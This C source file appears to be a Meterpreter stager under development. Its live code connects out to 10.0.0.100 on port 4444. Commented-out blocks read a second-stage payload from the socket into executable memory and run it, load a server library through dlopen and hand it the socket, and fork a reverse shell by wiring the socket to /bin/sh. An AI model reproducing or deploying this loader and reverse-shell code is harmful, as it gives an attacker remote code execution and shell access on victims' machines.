#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <arpa/inet.h> 
#include <dlfcn.h>

#include "metsrv/metsrv.h"

int get_socket(char* ip, int port)
{
    int sockfd = 0, n = 0;
    struct sockaddr_in serv_addr; 

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("Error: could not create socket\n");
        return 0;
    } 

    memset(&serv_addr, '0', sizeof(serv_addr)); 

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port); 

    if(inet_pton(AF_INET, ip, &serv_addr.sin_addr)<=0)
    {
        printf("Error: inet_pton error occured\n");
        return 0;
    } 

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
       printf("Error: connection failed\n");
       return 0;
    }    

    return sockfd; 
}

int main(int argc, char *argv[])
{
    
    int len = 0, count, done=0, options=0;
    char* buffer;
    //void (*function)();

    int socket = get_socket("10.0.0.100", 4444);
    
    if (!socket)
    {
        printf("Error creating socket\n");
        exit(1);
    }

    printf("Connected\n");

    /*count = read(socket, (char*)&len, 4);
    if (count != 4 || len <= 0) 
    {   
        printf("Error during recieving\n");     
        exit(1);
    }

    printf("Recieved: %d bytes\n", count);    
    printf("Stage length: %d bytes\n", len);
  
    buffer = mmap(0, len + 5, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_SHARED, -1, 0);
    if(buffer == MAP_FAILED) 
    {
        printf("Failed to mmap(): %s (%p) \n", strerror(errno), buffer);
        exit(EXIT_FAILURE);
    }

    //buffer = malloc(len + 5);
    //if (!buffer)
    //{
    //    printf("Error during allocating buffer\n");     
    //    exit(1);        
    //}

    while (done < len)
    {
        count = read(socket, buffer + 5 + done, len - done);
        done += count;
        printf("Recieved: %d bytes\n", count);
    }*/


    //int handle = NULL;
    //handle = dlopen(argv[1], RTLD_GLOBAL|RTLD_LAZY);

    //if (handle == NULL) {
    //    printf("failed to dlopen(%s)\n", argv[1]);
    //    perror("giving up");
    //    return (1);
    //}

    //Dl_info dli;
    //int (*init)(int) = NULL;
    //init = dlsym(handle, "server_setup");
    //if (init != NULL) {
    //  dladdr(init, &dli);
    //  init(socket); 
    //}

    return 0;
    //return server_setup(socket);
    //int i;
    //for (i=0; i<100; i++)
    //    printf("%02x ", *(char*)(buffer+5+i));

    //*buffer = (char)0xBF;
    //memcpy(buffer+1, &socket, 4);

    //function = (void*)(buffer);
    //function();

    //fp = (void *)buffer;
    //printf("entry point ahoy @ %p!\n", fp); fflush(stdout);
    //fp(5/*, options*/);
    //printf("entry point returned\n");

    //(*(void (*)())buffer)();
    //free(buffer);
    //return 0;

    //char *ex[4];

    //int socket = get_socket("127.0.0.1", 4444);
    
    //if (!socket) return;
    

    /*if (!fork())
    {
        dup2(socket, 0);
        dup2(socket, 1);
        dup2(socket, 2);

        ex[0]="/bin/sh";
        ex[1]="sh";
        ex[2]=NULL;
        execl(ex[0],ex[1],NULL);
    }*/
}
